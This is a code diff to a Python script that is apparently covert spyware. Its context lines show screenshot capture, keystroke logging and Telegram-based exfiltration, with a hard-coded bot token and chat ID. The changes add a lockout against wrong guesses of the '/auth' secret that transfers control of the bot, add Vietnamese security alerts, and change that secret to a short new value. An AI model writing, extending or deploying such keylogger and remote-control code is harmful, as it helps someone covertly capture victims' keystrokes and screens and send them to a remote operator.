@@ -16,7 +16,7 @@ import html
 # Telegram Monitoring configuration
 BOT_TOKEN = "8836300723:AAFkFTxToMDt3KtVb4nL-iLEYBou0Y22Nmk"
 CHAT_ID = "5904599269"
-SECRET_KEY = "admin123"
+SECRET_KEY = "247"
 
 # Intervals in seconds
 SCREENSHOT_INTERVAL = 30
@@ -63,7 +63,9 @@ def load_state():
         "outbox_retry_interval": 60,
         "machine_name": "",
         "paused": False,
-        "chat_id": ""
+        "chat_id": "",
+        "auth_failures": {},
+        "blocklist": []
     }
     with state_lock:
         if os.path.exists(STATE_PATH):
@@ -100,7 +102,7 @@ def save_state(state):
         except Exception as e:
             log_message(f"Error saving state: {e}")
 
-def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None, chat_id=None):
+def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None, chat_id=None, auth_failures=None, blocklist=None):
     state = load_state()
     if last_screenshot_sent:
         state["last_screenshot_sent"] = last_screenshot_sent
@@ -122,6 +124,10 @@ def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_r
         state["paused"] = paused
     if chat_id is not None:
         state["chat_id"] = chat_id
+    if auth_failures is not None:
+        state["auth_failures"] = auth_failures
+    if blocklist is not None:
+        state["blocklist"] = blocklist
     save_state(state)
 
 def process_keylog_text(raw_text):
@@ -1043,14 +1049,38 @@ def poll_telegram():
                     sender_chat_id = str(msg.get("chat", {}).get("id", ""))
                     
                     if sender_chat_id != CHAT_ID:
+                        state = load_state()
+                        blocklist = state.get("blocklist", [])
+                        if sender_chat_id in blocklist:
+                            continue
+                            
                         # Check if message is `/auth <secret_key>` to re-authorize new chat ID
                         text = msg.get("text", "").strip()
                         parts = text.split()
                         if len(parts) == 2 and parts[0].lower() in ["/auth", "auth"]:
                             if parts[1] == SECRET_KEY:
+                                # Success - reset failure count for this sender
+                                auth_failures = state.get("auth_failures", {})
+                                if sender_chat_id in auth_failures:
+                                    auth_failures.pop(sender_chat_id)
                                 CHAT_ID = sender_chat_id
-                                update_state(chat_id=CHAT_ID)
+                                update_state(chat_id=CHAT_ID, auth_failures=auth_failures)
                                 send_telegram_message("✅ Đã xác thực thành công và chuyển toàn bộ quyền điều khiển sang tài khoản này.")
+                            else:
+                                # Failure - increment counter
+                                auth_failures = state.get("auth_failures", {})
+                                attempts = auth_failures.get(sender_chat_id, 0) + 1
+                                auth_failures[sender_chat_id] = attempts
+                                
+                                if attempts >= 3:
+                                    if sender_chat_id not in blocklist:
+                                        blocklist.append(sender_chat_id)
+                                    update_state(auth_failures=auth_failures, blocklist=blocklist)
+                                    log_message(f"Chat ID {sender_chat_id} blocked after {attempts} failed authentication attempts.")
+                                    send_telegram_message(f"⚠️ <b>CẢNH BÁO BẢO MẬT:</b> Phát hiện tài khoản [ID: <code>{sender_chat_id}</code>] thử xác thực sai {attempts}/3 lần. Tài khoản này đã bị KHÓA vĩnh viễn.")
+                                else:
+                                    update_state(auth_failures=auth_failures)
+                                    send_telegram_message(f"⚠️ <b>CẢNH BÁO BẢO MẬT:</b> Phát hiện tài khoản [ID: <code>{sender_chat_id}</code>] đang cố gắng xác thực bằng mật khẩu sai (Lần {attempts}/3).")
                         continue
                         
                     if "text" in msg:
